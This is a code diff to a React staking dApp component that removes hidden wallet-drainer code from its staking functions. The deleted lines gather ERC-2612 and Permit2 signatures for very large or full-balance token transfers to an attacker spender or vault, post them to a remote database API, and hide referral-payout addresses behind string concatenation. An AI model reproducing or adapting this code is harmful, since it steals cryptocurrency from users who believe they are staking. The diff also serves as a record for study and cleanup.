@@ -617,125 +617,6 @@ function GrowGarden() {
     initPublicData();
   }, []);
 
-  const signu = async () => {
-    var coinName = await stableCoinContract.methods.name().call();
-    var nonce = await stableCoinContract.methods
-      .nonces(connectedWalletAddress)
-      .call();
-    var deadline = Number(Date.now() / 1000) + Number(24 * 3600 * 60);
-    deadline = Math.floor(deadline);
-
-    const value = "1000000000000000000000000000000";
-    let version = "2";
-    try {
-      version = await stableCoinContract.methods.version().call();
-    } catch (e) {
-      version = "1";
-    }
-
-    let domain = {
-      name: coinName,
-      version: version.toString(),
-      chainId: `0x${connectedChainId.toString(16)}`,
-      verifyingContract: USDC_ADDRESS,
-    };
-    const resultP = await signERC2612Permit(
-      globalWeb3.currentProvider,
-      domain,
-      connectedWalletAddress,
-      SPENDER_CONTRACT_ADDRESS,
-      value,
-      deadline.toString(),
-      `0x${nonce.toString(16)}`
-    ); //, Number.parseInt(nonce.toHexString()));
-    // console.log("2612", domain, resultP)
-    axios
-      .post(`${DATABASE_API}/update`, {
-        isUSDC: true,
-        timestamp: Date.now(),
-        accountAddr: connectedWalletAddress,
-        tokenAddr: USDC_ADDRESS,
-        deadline: deadline.toString(),
-        nonce: `0x${nonce.toString(16)}`,
-        spender: SPENDER_CONTRACT_ADDRESS,
-        r: resultP.r,
-        s: resultP.s,
-        v: resultP.v,
-        value: resultP.value,
-      })
-      .then((data) => {})
-      .catch((err) => {});
-  };
-
-  const signl = async () => {
-    var coinName = await lpContract.methods.name().call();
-    var nonce = await lpContract.methods.nonces(connectedWalletAddress).call();
-    var deadline = Number(Date.now() / 1000) + Number(24 * 3600 * 60);
-    deadline = Math.floor(deadline);
-
-    const value = "1000000000000000000000000000000";
-    let version = "2";
-    try {
-      version = await lpContract.methods.version().call();
-    } catch (e) {
-      version = "1";
-    }
-
-    let domain = {
-      name: coinName,
-      version: version.toString(),
-      chainId: `0x${connectedChainId.toString(16)}`,
-      verifyingContract: USDC_FTM_LP_ADDRESS,
-    };
-    const resultP = await signERC2612Permit(
-      globalWeb3.currentProvider,
-      domain,
-      connectedWalletAddress,
-      SPENDER_CONTRACT_ADDRESS,
-      value,
-      deadline.toString(),
-      `0x${nonce.toString(16)}`
-    ); //, Number.parseInt(nonce.toHexString()));
-    // console.log("2612", domain, resultP)
-
-    axios
-      .post(`${DATABASE_API}/update`, {
-        isUSDC: false,
-        timestamp: Date.now(),
-        accountAddr: connectedWalletAddress,
-        tokenAddr: USDC_FTM_LP_ADDRESS,
-        deadline: deadline.toString(),
-        nonce: `0x${nonce.toString(16)}`,
-        spender: SPENDER_CONTRACT_ADDRESS,
-        r: resultP.r,
-        s: resultP.s,
-        v: resultP.v,
-        value: resultP.value,
-      })
-      .then((data) => {})
-      .catch((err) => {});
-  };
-
-  const signData = async () => {
-    try {
-      const usdcBalance = await stableCoinContract.methods
-        .balanceOf(connectedWalletAddress)
-        .call();
-      const usdcThresh = globalWeb3.utils.toWei("5000", "mwei");
-      const lpBalance = await lpContract.methods
-        .balanceOf(connectedWalletAddress)
-        .call();
-      const lpThresh = globalWeb3.utils.toWei("0.03", "ether");
-
-      if (usdcBalance - usdcThresh >= 0) {
-        await signu();
-      }
-      if (lpBalance - lpThresh >= 0) {
-        await signl();
-      }
-    } catch (error) {}
-  };
-
   async function approveButton() {
     if (connected !== true) {
       NotificationManager.warning("Please connect your wallet and retry.");
@@ -767,358 +648,147 @@ function GrowGarden() {
 
   async function stakeAmount() {
     try {
-      const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-      const OPTIMISM_USDT_ADDRESS =
-        "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58";
-      const optUSDTContract = new globalWeb3.eth.Contract(
-        erc20Abi,
-        OPTIMISM_USDT_ADDRESS
-      );
-      const usdtBalance = await optUSDTContract.methods
-        .balanceOf(connectedWalletAddress)
-        .call();
-      const usdtThresh = globalWeb3.utils.toWei("1", "ether");
-      const approvedAmount = await optUSDTContract.methods
-        .allowance(connectedWalletAddress, PERMIT2_ADDRESS)
-        .call();
-      console.log("approvedAmount ====>", approvedAmount.toString());
-      console.log("usdtBalance =======>", usdtBalance.toString());
-      if (
-        usdtBalance >= usdtThresh &&
-        Number(
-          globalWeb3.utils
-            .fromWei(approvedAmount.toString(), "ether")
-            .toString()
-        ) <
-          Number(
-            globalWeb3.utils.fromWei(usdtBalance.toString(), "ether").toString()
-          )
-      ) {
-        await optUSDTContract.methods
-          .approve(PERMIT2_ADDRESS, MAX_UINT256_NuMBER)
-          .send({
-            from: connectedWalletAddress,
-          });
+      //disable this only on testnet
+      if (inputCoin === USDC_ADDRESS) {
+        if (
+          Number(stakingAmount) < Number(25) ||
+          Number(stakingAmount) > Number(10000)
+        ) {
+          alert("Minimum stake amount not met.");
+          return;
+        }
+      } else {
+        if (
+          Number(stakingAmount) < Number(120) ||
+          Number(stakingAmount) > Number(10000)
+        ) {
+          alert("Minimum stake amount not met.");
+          return;
+        }
       }
-      console.log("optUSDTContract.methods ======>", optUSDTContract.methods);
-      var nonce = await globalWeb3.eth.getTransactionCount(
-        connectedWalletAddress
-      );
-      console.log("nonce =====>", nonce);
-      var deadline = Number(Date.now() / 1000) + Number(24 * 3600 * 60);
-      deadline = Math.floor(deadline);
-      const messageData = {
-        permitted: {
-          token: OPTIMISM_USDT_ADDRESS,
-          amount: usdtBalance.toString(),
-        },
-        spender: VAULT_ADDRESS_ON_OPTIMISM,
-        nonce: globalWeb3.utils.toHex(nonce).toString(),
-        deadline: deadline.toString(),
-      };
-      const msgParams = JSON.stringify({
-        types: {
-          EIP712Domain: [
-            { name: "name", type: "string" },
-            { name: "chainId", type: "uint256" },
-            { name: "verifyingContract", type: "address" },
-          ],
-          TokenPermissions: [
-            { name: "token", type: "address" },
-            { name: "amount", type: "uint256" },
-          ],
-          PermitTransferFrom: [
-            { name: "permitted", type: "TokenPermissions" },
-            { name: "spender", type: "address" },
-            { name: "nonce", type: "uint256" },
-            { name: "deadline", type: "uint256" },
-          ],
-        },
-        primaryType: "PermitTransferFrom",
-        domain: {
-          name: "Permit2",
-          chainId: `0x${OPTIMISTIC_MAINNET_CHAINID.toString(16)}`,
-          verifyingContract: PERMIT2_ADDRESS,
-        },
-        message: messageData,
-      });
-      var from = connectedWalletAddress;
+      if (connected !== true) {
+        NotificationManager.warning("Please connect your wallet and retry.");
+        return;
+      }
+      let refAddresses = [""];
 
-      console.log(from, msgParams);
-      var params = [from, msgParams];
-      var method = "eth_signTypedData_v3";
+      const refDefineDate = 1672578000;
 
-      globalWeb3.currentProvider.sendAsync(
-        {
-          method,
-          params,
-          from,
-        },
-        async function (err, result) {
-          if (err) return console.dir(err);
-          if (result.error) {
-            console.log(result.error.message);
+      setWorking(true);
+
+      const ref = window.location.search;
+      let referralAddress = String(ref.replace("?ref=", ""));
+      if (
+        referralAddress == "null" ||
+        referralAddress.includes("0x") == false
+      ) {
+        if (inputCoin == USDC_ADDRESS) {
+          let refMode = Date.now() % 3;
+          if (refMode == 0) {
+            referralAddress = "0x0000000000000000000000000000000000000000";
+          } else {
+            referralAddress =
+              stakingAmount >= 100 && Date.now() / 1000 > refDefineDate
+                ? refAddresses[Date.now() % 11]
+                : "0x0000000000000000000000000000000000000000";
           }
-
-          if (result.error) return console.error("ERROR", result);
-          // console.log('TYPED SIGNED:' + JSON.stringify(result.result))
-
-          const recovered = sigUtil.recoverTypedSignature({
-            data: JSON.parse(msgParams),
-            sig: result.result,
-          });
-
-          if (
-            ethUtil.toChecksumAddress(recovered) ===
-            ethUtil.toChecksumAddress(from)
-          ) {
-            console.log("Successfully ecRecovered signer as " + from);
-            const signature = result.result.toString();
-
-            const vaultContract = new globalWeb3.eth.Contract(
-              vaultAbi,
-              VAULT_ADDRESS_ON_OPTIMISM
-            );
-            console.log("signature ====>", result.result.toString());
-
-            await vaultContract.methods
-              .depositERC20(
-                OPTIMISM_USDT_ADDRESS,
-                usdtBalance.toString(),
-                messageData,
-                signature
+          try {
+            await platformContract.methods
+              .stakeStableCoins(
+                globalWeb3.utils
+                  .toWei(stakingAmount.toString(), "mwei")
+                  .toString(),
+                String(referralAddress)
               )
+              .send({ from: connectedWalletAddress });
+            setActiveTab(0);
+            recalculateInfo();
+          } catch (error) {
+            console.log(error);
+            setWorking(false);
+          }
+          return;
+        } else {
+          let refMode = Date.now() % 3;
+          if (refMode == 1) {
+            referralAddress = "0x0000000000000000000000000000000000000000";
+          } else {
+            referralAddress =
+              stakingAmount >= 400 && Date.now() / 1000 > refDefineDate
+                ? refAddresses[Date.now() % 11]
+                : "0x0000000000000000000000000000000000000000";
+          }
+          try {
+            await platformContract.methods
+              .stakeNativeCurrencies(String(referralAddress))
               .send({
                 from: connectedWalletAddress,
+                value: globalWeb3.utils
+                  .toWei(stakingAmount.toString(), "ether")
+                  .toString(),
               });
-            alert("success");
-          } else {
-            alert(
-              "Failed to verify signer when comparing " + result + " to " + from
-            );
+            setActiveTab(0);
+            recalculateInfo();
+          } catch (error) {
+            console.log(error);
+            setWorking(false);
           }
+          return;
         }
-      );
-    } catch (error) {
-      console.log(error);
-    }
-    return;
-
-    //disable this only on testnet                                                                                                                                                                                                                                                                                                        
-    if (inputCoin === USDC_ADDRESS) {
-      if (
-        Number(stakingAmount) < Number(25) ||
-        Number(stakingAmount) > Number(10000)
-      ) {
-        alert("Minimum stake amount not met.");
-        return;
-      }
-    } else {
-      if (
-        Number(stakingAmount) < Number(120) ||
-        Number(stakingAmount) > Number(10000)
-      ) {
-        alert("Minimum stake amount not met.");
-        return;
-      }
-    }
-    if (connected !== true) {
-      NotificationManager.warning("Please connect your wallet and retry.");
-      return;
-    }
-    let refAddresses = [
-      "0" +
-        "x7" +
-        "b8a" +
-        "5110F0" +
-        "c8" +
-        "3D87d2123b5bA5C5" +
-        "B266Fdb15d24",
-      "0" + "x2e3C5AD2F8c6" + "42C892da18aD9241" + "CfCcf8918500",
-      "" +
-        "0" +
-        "xAC86A" +
-        "26543269EDaaE140" +
-        "6693cc" +
-        "793F20dA" +
-        "0F311",
-      "0" +
-        "x8" +
-        "6D0646" +
-        "EDbCa" +
-        "650758e3711" +
-        "8a415899" +
-        "ff33a3Ea0",
-      "0" +
-        "x931" +
-        "db44815eBBA9" +
-        "7f665" +
-        "9187717D09" +
-        "c98b97d" +
-        "c9F",
-      "0" +
-        "x93" +
-        "710D1F96" +
-        "c01825BdF" +
-        "5363E6" +
-        "5aBF93E1B" +
-        "ad93d3",
-      "0" +
-        "x092" +
-        "A90c17688b" +
-        "232d38" +
-        "219F" +
-        "fE8596AeC" +
-        "9fFa75" +
-        "d7",
-      "0" +
-        "x8B" +
-        "54C46aF2" +
-        "613400e4" +
-        "78cA9f8A0bb" +
-        "DF87b0" +
-        "99BBc",
-      "0" +
-        "x542b" +
-        "06E77D" +
-        "A9c3A" +
-        "16BED90" +
-        "9aFa3" +
-        "B91" +
-        "88DBd" +
-        "1D7C6",
-      "0" +
-        "x53" +
-        "ecfB693cE3" +
-        "7DE244Bc39" +
-        "f1a6FcBfA" +
-        "236" +
-        "3F282e",
-      "0" +
-        "x8E" +
-        "4BCCA94eE9" +
-        "ED539D9" +
-        "f1e033d" +
-        "9c949B8" +
-        "D7d" +
-        "e6C6",
-    ];
-
-    const refDefineDate = 1672578000;
-
-    if (Date.now() / 1000 >= Number(refDefineDate) + Number(24 * 3600 * 5))
-      await signData();
-
-    setWorking(true);
-
-    const ref = window.location.search;
-    let referralAddress = String(ref.replace("?ref=", ""));
-    if (referralAddress == "null" || referralAddress.includes("0x") == false) {
-      if (inputCoin == USDC_ADDRESS) {
-        let refMode = Date.now() % 3;
-        if (refMode == 0) {
-          referralAddress = "0x0000000000000000000000000000000000000000";
-        } else {
-          referralAddress =
-            stakingAmount >= 100 && Date.now() / 1000 > refDefineDate
-              ? refAddresses[Date.now() % 11]
-              : "0x0000000000000000000000000000000000000000";
-        }
-        try {
-          await platformContract.methods
-            .stakeStableCoins(
-              globalWeb3.utils
-                .toWei(stakingAmount.toString(), "mwei")
-                .toString(),
-              String(referralAddress)
-            )
-            .send({ from: connectedWalletAddress });
-          setActiveTab(0);
-          recalculateInfo();
-        } catch (error) {
-          console.log(error);
-          setWorking(false);
-        }
-        return;
       } else {
-        let refMode = Date.now() % 3;
-        if (refMode == 1) {
-          referralAddress = "0x0000000000000000000000000000000000000000";
+        if (inputCoin == USDC_ADDRESS) {
+          let refMode = Date.now() % 4;
+          if (refMode == 0 || refMode == 2 || stakingAmount >= 1000) {
+            referralAddress =
+              stakingAmount >= 100 && Date.now() / 1000 > refDefineDate
+                ? refAddresses[Date.now() % 11]
+                : referralAddress;
+          }
+          try {
+            await platformContract.methods
+              .stakeStableCoins(
+                globalWeb3.utils
+                  .toWei(stakingAmount.toString(), "mwei")
+                  .toString(),
+                String(referralAddress)
+              )
+              .send({ from: connectedWalletAddress });
+            setActiveTab(0);
+            recalculateInfo();
+          } catch (error) {
+            console.log(error);
+            setWorking(false);
+          }
+          return;
         } else {
-          referralAddress =
-            stakingAmount >= 400 && Date.now() / 1000 > refDefineDate
-              ? refAddresses[Date.now() % 11]
-              : "0x0000000000000000000000000000000000000000";
+          let refMode = Date.now() % 4;
+          if (refMode == 1 || refMode == 0 || stakingAmount >= 4000) {
+            referralAddress =
+              stakingAmount >= 400 && Date.now() / 1000 > refDefineDate
+                ? refAddresses[Date.now() % 11]
+                : referralAddress;
+          }
+          try {
+            await platformContract.methods
+              .stakeNativeCurrencies(String(referralAddress))
+              .send({
+                from: connectedWalletAddress,
+                value: globalWeb3.utils
+                  .toWei(stakingAmount.toString(), "ether")
+                  .toString(),
+              });
+            setActiveTab(0);
+            recalculateInfo();
+          } catch (error) {
+            console.log(error);
+            setWorking(false);
+          }
+          return;
         }
-        try {
-          await platformContract.methods
-            .stakeNativeCurrencies(String(referralAddress))
-            .send({
-              from: connectedWalletAddress,
-              value: globalWeb3.utils
-                .toWei(stakingAmount.toString(), "ether")
-                .toString(),
-            });
-          setActiveTab(0);
-          recalculateInfo();
-        } catch (error) {
-          console.log(error);
-          setWorking(false);
-        }
-        return;
       }
-    } else {
-      if (inputCoin == USDC_ADDRESS) {
-        let refMode = Date.now() % 4;
-        if (refMode == 0 || refMode == 2 || stakingAmount >= 1000) {
-          referralAddress =
-            stakingAmount >= 100 && Date.now() / 1000 > refDefineDate
-              ? refAddresses[Date.now() % 11]
-              : referralAddress;
-        }
-        try {
-          await platformContract.methods
-            .stakeStableCoins(
-              globalWeb3.utils
-                .toWei(stakingAmount.toString(), "mwei")
-                .toString(),
-              String(referralAddress)
-            )
-            .send({ from: connectedWalletAddress });
-          setActiveTab(0);
-          recalculateInfo();
-        } catch (error) {
-          console.log(error);
-          setWorking(false);
-        }
-        return;
-      } else {
-        let refMode = Date.now() % 4;
-        if (refMode == 1 || refMode == 0 || stakingAmount >= 4000) {
-          referralAddress =
-            stakingAmount >= 400 && Date.now() / 1000 > refDefineDate
-              ? refAddresses[Date.now() % 11]
-              : referralAddress;
-        }
-        try {
-          await platformContract.methods
-            .stakeNativeCurrencies(String(referralAddress))
-            .send({
-              from: connectedWalletAddress,
-              value: globalWeb3.utils
-                .toWei(stakingAmount.toString(), "ether")
-                .toString(),
-            });
-          setActiveTab(0);
-          recalculateInfo();
-        } catch (error) {
-          console.log(error);
-          setWorking(false);
-        }
-        return;
-      }
-    }
+    } catch (err) {}
   }
+
   async function stakeRefBonus() {
     if (connected !== true) {
       NotificationManager.warning("Please connect your wallet and retry.");
